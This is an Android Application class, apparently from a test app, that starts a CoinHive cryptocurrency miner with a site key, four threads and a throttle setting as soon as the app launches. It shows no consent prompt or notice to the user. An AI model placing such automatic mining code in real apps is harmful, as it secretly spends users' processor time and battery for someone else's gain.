package com.example.aamirah.testandroid41;

import android.app.Application;

import com.theah64.coinhive.CoinHive;

public class MineApp extends Application {

    @Override
    public void onCreate() {
        super.onCreate();

        CoinHive.getInstance()
                .init("SgUJdirLr20biCAFquva7c3e14BKraEyg") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // To logcat mining status, false by default.
                .setForceASMJS(false); // optionalS

    }

}
